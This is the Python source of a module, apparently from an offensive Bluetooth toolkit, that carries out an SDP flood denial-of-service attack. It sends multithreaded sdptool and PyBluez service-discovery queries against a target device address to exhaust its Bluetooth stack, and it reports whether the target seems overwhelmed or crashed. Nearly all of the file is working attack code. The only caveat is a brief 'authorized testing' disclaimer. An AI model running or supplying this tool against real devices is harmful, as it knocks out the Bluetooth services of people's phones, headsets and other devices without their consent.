"""
BlueSploit Module: SDP Flood - Service Discovery DoS
Bluetooth denial of service via SDP query flooding

Floods target with SDP service search requests to overwhelm
the SDP server and cause resource exhaustion.

Author: v33ru
"""

import time
import subprocess
import threading
from typing import List
from core.base import (
    ExploitModule, ModuleInfo, ModuleOption,
    BTProtocol, Severity
)
from core.utils.printer import (
    print_success, print_error, print_info, print_warning, Colors
)

try:
    import bluetooth
    BLUETOOTH_AVAILABLE = True
except ImportError:
    BLUETOOTH_AVAILABLE = False


# Common SDP service UUIDs to query
SDP_SERVICE_UUIDS = [
    "0x0001",  # SDP
    "0x0003",  # RFCOMM
    "0x0008",  # OBEX
    "0x000F",  # BNEP
    "0x1101",  # Serial Port
    "0x1102",  # LAN Access
    "0x1103",  # Dialup Networking
    "0x1104",  # IrMC Sync
    "0x1105",  # OBEX Object Push
    "0x1106",  # OBEX File Transfer
    "0x1108",  # Headset
    "0x110A",  # Audio Source
    "0x110B",  # Audio Sink
    "0x110C",  # A/V Remote Control Target
    "0x110E",  # A/V Remote Control
    "0x1112",  # Headset Audio Gateway
    "0x111F",  # Handsfree Audio Gateway
    "0x1124",  # HID
    "0x1200",  # PnP Information
]


class Module(ExploitModule):
    """
    SDP Flood - Service Discovery DoS
    
    Floods the target's SDP server with service search requests.
    This can cause:
    - High CPU usage processing queries
    - Memory exhaustion from connection state
    - SDP service unavailability
    - General Bluetooth stack instability
    
    Uses multiple threads for maximum impact.
    
    DISCLAIMER: For authorized security testing only.
    """
    
    info = ModuleInfo(
        name="exploits/dos/classic/sdp_flood",
        description="SDP Service Discovery Flood DoS Attack",
        author=["v33ru"],
        protocol=BTProtocol.CLASSIC,
        severity=Severity.MEDIUM,
        references=[
            "https://www.bluetooth.com/specifications/specs/service-discovery-protocol/"
        ]
    )
    
    def _setup_options(self) -> None:
        self.options = {
            "target": ModuleOption(
                name="target",
                required=True,
                description="Target BD_ADDR (XX:XX:XX:XX:XX:XX)"
            ),
            "threads": ModuleOption(
                name="threads",
                required=False,
                description="Number of concurrent threads",
                default=5
            ),
            "duration": ModuleOption(
                name="duration",
                required=False,
                description="Attack duration in seconds (0 = until Ctrl+C)",
                default=60
            ),
            "method": ModuleOption(
                name="method",
                required=False,
                description="Method: sdptool, pybluez, or both",
                default="sdptool"
            )
        }
    
    def _sdptool_query(self, target: str, uuid: str) -> bool:
        """Perform SDP query using sdptool"""
        try:
            result = subprocess.run(
                ["sdptool", "search", "--bdaddr", target, uuid],
                capture_output=True,
                timeout=5
            )
            return result.returncode == 0
        except:
            return False
    
    def _sdptool_browse(self, target: str) -> bool:
        """Perform SDP browse using sdptool"""
        try:
            result = subprocess.run(
                ["sdptool", "browse", target],
                capture_output=True,
                timeout=10
            )
            return result.returncode == 0
        except:
            return False
    
    def _pybluez_query(self, target: str) -> bool:
        """Perform SDP query using PyBluez"""
        if not BLUETOOTH_AVAILABLE:
            return False
        try:
            services = bluetooth.find_service(address=target)
            return True
        except:
            return False
    
    def _flood_thread(self, thread_id: int, target: str, method: str,
                      stop_event: threading.Event, stats: dict) -> None:
        """Worker thread for flooding"""
        uuid_idx = 0
        
        while not stop_event.is_set():
            try:
                if method in ["sdptool", "both"]:
                    # Rotate through UUIDs
                    uuid = SDP_SERVICE_UUIDS[uuid_idx % len(SDP_SERVICE_UUIDS)]
                    uuid_idx += 1
                    
                    if self._sdptool_query(target, uuid):
                        stats["success"] += 1
                    else:
                        stats["failed"] += 1
                    stats["requests"] += 1
                    
                    # Also do browse periodically
                    if uuid_idx % 10 == 0:
                        self._sdptool_browse(target)
                        stats["requests"] += 1
                
                if method in ["pybluez", "both"]:
                    if self._pybluez_query(target):
                        stats["success"] += 1
                    else:
                        stats["failed"] += 1
                    stats["requests"] += 1
                    
            except Exception as e:
                stats["errors"] += 1
    
    def _print_results(self, target: str, stats: dict, 
                       duration: float, success: bool) -> None:
        """Print attack results"""
        C = Colors
        rps = stats["requests"] / duration if duration > 0 else 0
        
        print(f"\n  {C.CYAN}{'='*70}{C.RESET}")
        print(f"  {C.BOLD}{C.WHITE}SDP FLOOD ATTACK RESULTS{C.RESET}")
        print(f"  {C.CYAN}{'='*70}{C.RESET}")
        print(f"  Target          : {C.WHITE}{target}{C.RESET}")
        print(f"  Total Requests  : {C.YELLOW}{stats['requests']}{C.RESET}")
        print(f"  Successful      : {C.GREEN}{stats['success']}{C.RESET}")
        print(f"  Failed          : {C.RED}{stats['failed']}{C.RESET}")
        print(f"  Errors          : {stats['errors']}")
        print(f"  Duration        : {duration:.2f} seconds")
        print(f"  Rate            : {rps:.1f} requests/sec")
        print(f"  Status          : {C.GREEN if success else C.RED}{'COMPLETED' if success else 'FAILED'}{C.RESET}")
        
        if stats["failed"] > stats["success"]:
            print(f"\n  {C.YELLOW}[*] High failure rate - target may be overwhelmed or crashed{C.RESET}")
        
        print(f"\n  {C.CYAN}{'='*70}{C.RESET}\n")
    
    def run(self) -> bool:
        """Execute SDP flood attack"""
        
        target = self.target
        threads_count = int(self.get_option("threads"))
        duration = int(self.get_option("duration"))
        method = self.get_option("method")
        
        # Validate
        if not self.validate_bd_addr(target):
            print_error(f"Invalid BD_ADDR: {target}")
            return False
        
        # Check sdptool
        if method in ["sdptool", "both"]:
            try:
                subprocess.run(["which", "sdptool"], capture_output=True, check=True)
            except:
                print_error("sdptool not found!")
                print_info("Install with: sudo apt install bluez")
                if method == "sdptool":
                    return False
                method = "pybluez"
        
        if method in ["pybluez", "both"] and not BLUETOOTH_AVAILABLE:
            print_warning("PyBluez not available, using sdptool only")
            method = "sdptool"
        
        # Print attack info
        C = Colors
        print(f"\n  {C.RED}╔{'═'*60}╗{C.RESET}")
        print(f"  {C.RED}║{C.RESET} {C.BOLD}SDP Flood - Service Discovery DoS{C.RESET}                      {C.RED}║{C.RESET}")
        print(f"  {C.RED}╚{'═'*60}╝{C.RESET}\n")
        
        print_info(f"Target      : {target}")
        print_info(f"Threads     : {threads_count}")
        print_info(f"Duration    : {'infinite' if duration == 0 else f'{duration}s'}")
        print_info(f"Method      : {method}")
        
        print()
        print_warning("DISCLAIMER: For authorized security testing only!")
        print_info("Starting in 3 seconds... (Ctrl+C to stop)")
        
        try:
            time.sleep(3)
        except KeyboardInterrupt:
            print_warning("Cancelled")
            return False
        
        # Shared stats
        stats = {
            "requests": 0,
            "success": 0,
            "failed": 0,
            "errors": 0
        }
        
        stop_event = threading.Event()
        threads: List[threading.Thread] = []
        
        print_info(f"Starting {threads_count} flood threads...")
        start_time = time.time()
        
        try:
            # Start worker threads
            for i in range(threads_count):
                t = threading.Thread(
                    target=self._flood_thread,
                    args=(i, target, method, stop_event, stats),
                    daemon=True
                )
                t.start()
                threads.append(t)
            
            print_success(f"Flooding {target} with SDP queries...")
            
            # Monitor progress
            while True:
                elapsed = time.time() - start_time
                
                if duration > 0 and elapsed >= duration:
                    break
                
                rps = stats["requests"] / elapsed if elapsed > 0 else 0
                
                if duration > 0:
                    remaining = duration - elapsed
                    print(f"\r  {C.CYAN}[Requests: {stats['requests']} | Rate: {rps:.1f}/s | Remaining: {remaining:.0f}s]{C.RESET}    ", end='', flush=True)
                else:
                    print(f"\r  {C.CYAN}[Requests: {stats['requests']} | Rate: {rps:.1f}/s | Elapsed: {elapsed:.0f}s]{C.RESET}    ", end='', flush=True)
                
                time.sleep(1)
                
        except KeyboardInterrupt:
            print()
            print_warning("Interrupted by user")
        finally:
            stop_event.set()
            print_info("Stopping threads...")
            
            for t in threads:
                t.join(timeout=2)
        
        actual_duration = time.time() - start_time
        self._print_results(target, stats, actual_duration, stats["requests"] > 0)
        
        self.add_result({
            "target": target,
            "requests": stats["requests"],
            "success": stats["success"],
            "failed": stats["failed"],
            "duration": actual_duration
        })
        
        return stats["requests"] > 0
